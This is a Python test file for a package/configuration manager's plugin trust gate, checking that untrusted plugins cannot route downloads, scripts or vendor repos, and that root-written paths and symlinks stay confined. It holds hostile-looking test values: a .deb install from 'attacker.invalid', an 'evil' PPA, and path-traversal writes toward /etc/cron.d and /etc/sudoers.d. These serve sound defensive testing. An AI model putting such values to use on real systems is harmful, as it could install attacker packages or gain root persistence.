'''review-2026-11-2 A1: an UNTRUSTED plugin layer may define components, but its bindings that carry
commands, root writes or downloads (vendor repos/keys, .deb/.rpm files, tarballs, AppImages, builds,
scripts, glue, dotfiles, services, groups, version URLs) are not candidates until `plugin trust` —
one gate at resolution (trustgate), re-checked by run_plan. Plain packages by name from a registry
the system already trusts still route. The primary follows `primary-trust:` (default identity).'''

import pytest

from configsys import plugins, trustgate
from configsys.app import Context, build_parser
from configsys.errors import ConfigsysError


def _home(tmp_path, data, *, name='evil', primary=False, top_extra=''):
    home = tmp_path / 'home'
    state = home / '.config' / 'configsys'
    pdir = state / 'plugins' / name
    pdir.mkdir(parents=True)
    (pdir / 'plugin.hu').write_text(f'{{ name: {name}  requires-abi: 1  data: [ {name}.hu ] }}\n')
    (pdir / f'{name}.hu').write_text(data)
    prim = '  primary: true' if primary else ''
    (state / 'configsys.hu').write_text(f'{{ plugins: [ {{ source: "{pdir}"{prim} }} ]\n{top_extra}\n}}\n')
    return home, pdir


def _ctx(home, *extra):
    return Context(build_parser().parse_args(['--home', str(home), '--os', 'pop', *extra, 'inspect']))


def _winner(ctx, name):
    units, errors = ctx.routes.resolve_resilient([name])
    keys = [k for k, u in units.items() if u.comp == name]
    return (keys[0].split('\\')[0] if keys else None), errors.get(name, '')


DEB_HIJACK = ('{ components: { btop: { install: [ { via: native-pkg-file  when: "pop_os!"\n'
              '    url: "http://attacker.invalid/btop.deb" } ] } } }\n')


def test_an_untrusted_plugins_deb_never_wins_over_the_core_route(tmp_path):
    home, _ = _home(tmp_path, DEB_HIJACK)
    via, err = _winner(_ctx(home), 'btop')
    assert via == 'apt' and not err                      # the narrower .deb binding isn't a candidate


def test_the_where_view_says_why_it_was_passed_over(tmp_path):
    from configsys import resolve
    home, _ = _home(tmp_path, DEB_HIJACK)
    ctx = _ctx(home)
    r = ctx.routes
    b = next(b for b in r.components['btop'].bindings if b.via == 'native-pkg-file')
    why = resolve.driver_gate_reason(b, r.cascade, r.context())
    assert 'untrusted plugin' in why and 'plugin trust' in why


@pytest.mark.parametrize('binding', [
    '{ via: tarball  url: "https://x.invalid/t.tgz"  installDir: demo }',
    '{ via: script  install-cmd: "true"  version-cmd: "echo 1"  uninstall-cmd: "true" }',
    '{ via: native  source-line: "deb http://x.invalid stable main"  pubkey-url: "http://x.invalid/k" }',
    '{ via: native  ppa: "ppa:evil/ppa" }',
    '{ via: appImage  url: "https://x.invalid/a.AppImage" }',
    '{ via: cargo  name: demo }',
    '{ via: group  name: docker }',
    '{ via: flatpak  hub: evil  hub-url: "https://x.invalid/repo"  app: org.x.Demo }',
    '{ via: native  name: demotool  version: { url: "http://x.invalid/v"  regex: "(.*)" } }',
])
def test_command_carrying_bindings_wait_for_trust(tmp_path, binding):
    home, _ = _home(tmp_path, f'{{ components: {{ demotool: {{ install: [ {binding} ] }} }} }}\n')
    via, err = _winner(_ctx(home), 'demotool')
    assert via is None and 'untrusted' in err and 'plugin trust' in err


def test_a_plain_package_by_name_still_routes(tmp_path):
    home, _ = _home(tmp_path, '{ components: { demotool: { install: [ { via: native  name: demo-pkg }\n'
                              '    { via: flatpak  hub: flathub  app: org.x.Demo } ] } } }\n')
    via, err = _winner(_ctx(home), 'demotool')
    assert via == 'apt' and not err


def test_trusting_the_plugin_opens_its_bindings(tmp_path):
    home, pdir = _home(tmp_path, '{ components: { demotool: { install: [\n'
                                 '  { via: tarball  url: "https://x.invalid/t.tgz"  installDir: demo } ] } } }\n')
    state = home / '.config' / 'configsys'
    assert plugins.ships_executable_data(pdir)               # so `plugin trust` accepts it
    plugins.set_trust(state / 'plugin-trust.hu', 'evil', plugins.plugin_identity(pdir))
    via, err = _winner(_ctx(home), 'demotool')
    assert via == 'tarball' and not err


def test_the_primary_is_trusted_by_identity_unless_you_say_content(tmp_path):
    data = '{ components: { demotool: { install: [ { via: tarball  url: "https://x.invalid/t"  installDir: d } ] } } }\n'
    home, _ = _home(tmp_path / 'a', data, name='mine', primary=True)
    assert _winner(_ctx(home), 'demotool')[0] == 'tarball'   # default primary-trust: identity
    home, _ = _home(tmp_path / 'b', data, name='mine', primary=True, top_extra='primary-trust: content')
    via, err = _winner(_ctx(home), 'demotool')
    assert via is None and 'untrusted' in err


def test_binding_needs_trust_table():
    assert trustgate.binding_needs_trust('native', {'name': 'x'}, 'apt') is None
    assert trustgate.binding_needs_trust('native', {'debconf': 'x'}, 'apt')
    assert trustgate.binding_needs_trust('snap', {'name': 'x', 'classic': True})
    assert trustgate.binding_needs_trust('brew', {'name': 'x'}) is None
    assert trustgate.binding_needs_trust('dotfiles', {'config': {}})
    assert trustgate.binding_needs_trust('parts', {'parts': ['a']}) is None
    assert trustgate.binding_needs_trust('no-such-driver', {})


def test_run_plan_refuses_an_untrusted_step_even_if_one_slips_through(tmp_path):
    from configsys.actions import run_plan
    from configsys.componentObj import ResolvedComponent
    home, pdir = _home(tmp_path, DEB_HIJACK)
    ctx = _ctx(home, '--pretend')
    rc = ResolvedComponent(key='tarball\\demotool', driver='tarball', comp='demotool', via='tarball',
                           fields={'url': 'https://x.invalid/t.tgz', 'installDir': 'demo'},
                           source=str(pdir / 'evil.hu'))
    lines = []
    res = run_plan(ctx, [('install', rc.key, rc)], on_line=lines.append)
    assert res.outcomes[0].detail == 'untrusted plugin' and res.rc_code == 1
    assert not any('[pretend]' in ln and 'curl' in ln for ln in lines)


def test_an_install_receipt_remembers_its_layer(tmp_path):
    from configsys.componentObj import ResolvedComponent
    from configsys.ledger import Ledger
    from configsys.stranded import _rc_from_receipt
    led = Ledger()
    rc = ResolvedComponent(key='script\\x', driver='script', comp='x', via='script',
                           fields={'name': 'x', 'install-cmd': 'true'}, source='/p/plugins/evil/evil.hu')
    led.set_receipt(rc)
    back = _rc_from_receipt('script\\x', led.receipt('script\\x'), 'x')
    assert back.source == '/p/plugins/evil/evil.hu'


def test_an_untrusted_plugins_keys_are_ignored_until_trusted(tmp_path):
    from configsys.tui.keyspec import config_keys
    home, pdir = _home(tmp_path, '{ keys: { plugins: { trust-all: j } } }\n')
    ctx = _ctx(home)
    assert config_keys(ctx.config).get('plugins', {}).get('trust-all') != 'j'
    plugins.set_trust(home / '.config' / 'configsys' / 'plugin-trust.hu', 'evil',
                      plugins.plugin_identity(pdir))
    ctx = _ctx(home)
    assert config_keys(ctx.config)['plugins']['trust-all'] == 'j'


def test_a_bad_forced_os_still_errors_cleanly(tmp_path):
    home, _ = _home(tmp_path, DEB_HIJACK)
    with pytest.raises(ConfigsysError):
        Context(build_parser().parse_args(['--home', str(home), '--os', 'nosuchos', 'inspect'])).routes.context()


# -- A1 phase 2: containment + identity -----------------------------------------------------------

def test_identity_is_length_prefixed_so_trees_cant_collide(tmp_path):
    a, b = tmp_path / 'a', tmp_path / 'b'
    a.mkdir(); b.mkdir()
    (a / 'a').write_bytes(b'X'); (a / 'b').write_bytes(b'Y')
    (b / 'a').write_bytes(b'X\0b\0Y')                        # the old format's collision (plugins-08)
    assert plugins.plugin_identity(a) != plugins.plugin_identity(b)


def test_identity_hashes_a_symlink_as_a_link_not_its_target(tmp_path):
    outside = tmp_path / 'outside.py'
    outside.write_text('one')
    p = tmp_path / 'p'
    p.mkdir()
    (p / 'plugin.hu').write_text('{ name: p }')
    (p / 'code.py').symlink_to(outside)
    before = plugins.plugin_identity(p)
    outside.write_text('two')                                # the target changes...
    assert plugins.plugin_identity(p) == before              # ...but trust never covered it, so:
    assert plugins.uncontained_entries(p, {'code': 'code.py'}) == ['code.py']   # it isn't loaded


def test_data_and_code_entries_must_stay_in_the_checkout(tmp_path):
    p = tmp_path / 'plugins' / 'p'
    p.mkdir(parents=True)
    (tmp_path / 'plugins' / 'other.hu').write_text('{ components: {} }')
    (p / 'mine.hu').write_text('{ components: {} }')
    man = {'data': ['mine.hu', '../other.hu'], 'code': '../x.py'}
    assert plugins._data_files(p, man) == [str(p / 'mine.hu')]
    assert set(plugins.uncontained_entries(p, man)) == {'../other.hu', '../x.py'}
    with pytest.raises(FileNotFoundError, match='outside'):
        plugins._import_module(p, man)


@pytest.mark.parametrize('field,value', [
    ('pubkey-path', '/etc/cron.d/x'), ('pubkey-path', '/usr/share/keyrings/../../etc/x'),
    ('source-path', '/etc/apt/sources.list.d/sub/x.list'), ('repo-id', '../../etc/x'),
])
def test_root_written_vendor_paths_are_confined(field, value):
    from configsys.routecheck import vendor_path_problem
    assert vendor_path_problem({field: value})
    assert vendor_path_problem({'pubkey-path': '/usr/share/keyrings/k.gpg',
                                'source-path': '/etc/apt/sources.list.d/k.list', 'repo-id': 'k6'}) is None
    assert vendor_path_problem({'apt-source': {'key-path': '/etc/sudoers.d/x'}})


def test_an_approval_in_the_old_hash_format_still_matches_unchanged_content(tmp_path):
    p = tmp_path / 'p'
    p.mkdir()
    (p / 'plugin.hu').write_text('{ name: p  code: d.py }')
    (p / 'd.py').write_text('DRIVERS = []\n')
    old = plugins.legacy_identity(p)
    assert old != plugins.plugin_identity(p) and plugins.approval_matches(old, p)
    (p / 'd.py').write_text('DRIVERS = []  # changed\n')
    assert not plugins.approval_matches(old, p)              # any change: re-approve
